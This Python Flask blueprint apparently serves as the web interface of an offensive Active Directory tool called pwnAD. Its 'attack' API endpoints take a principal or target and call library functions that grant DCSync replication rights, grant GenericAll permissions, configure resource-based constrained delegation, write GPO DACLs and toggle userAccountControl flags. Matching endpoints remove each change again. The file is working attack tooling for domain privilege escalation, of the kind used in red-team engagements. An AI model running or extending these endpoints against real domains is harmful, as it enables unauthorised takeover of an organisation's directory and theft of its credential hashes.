import logging

from flask import Blueprint, request, render_template, current_app, jsonify

attack_bp = Blueprint('attack', __name__)


def _get_conn():
    return current_app.config['LDAP_CONNECTION']


def _base_context(active_page='attacks'):
    conn = _get_conn()
    return {
        'domain': conn.domain,
        'dc_ip': conn.target,
        'session_user': getattr(conn, 'ldap_user', '') or getattr(conn, 'user', ''),
        'active_page': active_page,
    }


def _json_response(success, message, status=200):
    return jsonify(success=success, message=message), status


@attack_bp.route('/attacks')
def attacks_view():
    ctx = _base_context('attacks')
    return render_template('attacks.html', **ctx)


@attack_bp.route('/api/attack/dcsync', methods=['POST'])
def attack_dcsync():
    conn = _get_conn()
    principal = request.form.get('principal', '').strip()
    if not principal:
        return _json_response(False, 'Missing principal', 400)
    try:
        from pwnAD.commands.add import dcsync
        dcsync(conn, principal)
        return _json_response(True, f'DCSync rights granted to {principal}')
    except Exception as e:
        logging.error(f"dcsync error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/dcsync/remove', methods=['POST'])
def attack_dcsync_remove():
    conn = _get_conn()
    principal = request.form.get('principal', '').strip()
    if not principal:
        return _json_response(False, 'Missing principal', 400)
    try:
        from pwnAD.commands.remove import dcsync
        dcsync(conn, principal)
        return _json_response(True, f'DCSync rights removed from {principal}')
    except Exception as e:
        logging.error(f"dcsync remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/generic-all', methods=['POST'])
def attack_generic_all():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    principal = request.form.get('principal', '').strip()
    if not target or not principal:
        return _json_response(False, 'Missing target or principal', 400)
    try:
        from pwnAD.commands.add import genericAll
        genericAll(conn, target, principal)
        return _json_response(True, f'GenericAll granted to {principal} over {target}')
    except Exception as e:
        logging.error(f"genericAll error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/generic-all/remove', methods=['POST'])
def attack_generic_all_remove():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    principal = request.form.get('principal', '').strip()
    if not target or not principal:
        return _json_response(False, 'Missing target or principal', 400)
    try:
        from pwnAD.commands.remove import genericAll
        genericAll(conn, target, principal)
        return _json_response(True, f'GenericAll removed from {principal} over {target}')
    except Exception as e:
        logging.error(f"genericAll remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/rbcd', methods=['POST'])
def attack_rbcd():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    grantee = request.form.get('grantee', '').strip()
    if not target or not grantee:
        return _json_response(False, 'Missing target or grantee', 400)
    try:
        from pwnAD.commands.add import RBCD
        RBCD(conn, target, grantee)
        return _json_response(True, f'RBCD configured: {grantee} can delegate to {target}')
    except Exception as e:
        logging.error(f"RBCD error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/rbcd/remove', methods=['POST'])
def attack_rbcd_remove():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    if not target:
        return _json_response(False, 'Missing target', 400)
    try:
        from pwnAD.commands.remove import RBCD
        RBCD(conn, target)
        return _json_response(True, f'RBCD cleared for {target}')
    except Exception as e:
        logging.error(f"RBCD remove error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/gpo-dacl', methods=['POST'])
def attack_gpo_dacl():
    conn = _get_conn()
    user = request.form.get('user', '').strip()
    gpo_id = request.form.get('gpo_id', '').strip()
    if not user or not gpo_id:
        return _json_response(False, 'Missing user or GPO ID', 400)
    try:
        from pwnAD.commands.add import write_gpo_dacl
        write_gpo_dacl(conn, user, gpo_id)
        return _json_response(True, f'GPO DACL written for {user} on {gpo_id}')
    except Exception as e:
        logging.error(f"GPO DACL error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/uac/add', methods=['POST'])
def attack_uac_add():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    flags = request.form.get('flags', '').strip()
    if not target or not flags:
        return _json_response(False, 'Missing target or flags', 400)
    try:
        flag_list = [f.strip() for f in flags.split(',') if f.strip()]
        from pwnAD.commands.add import uac
        uac(conn, target, flag_list)
        return _json_response(True, f'UAC flags {flag_list} added to {target}')
    except Exception as e:
        logging.error(f"UAC add error: {e}")
        return _json_response(False, str(e))


@attack_bp.route('/api/attack/uac/remove', methods=['POST'])
def attack_uac_remove():
    conn = _get_conn()
    target = request.form.get('target', '').strip()
    flags = request.form.get('flags', '').strip()
    if not target or not flags:
        return _json_response(False, 'Missing target or flags', 400)
    try:
        flag_list = [f.strip() for f in flags.split(',') if f.strip()]
        from pwnAD.commands.remove import uac
        uac(conn, target, flag_list)
        return _json_response(True, f'UAC flags {flag_list} removed from {target}')
    except Exception as e:
        logging.error(f"UAC remove error: {e}")
        return _json_response(False, str(e))
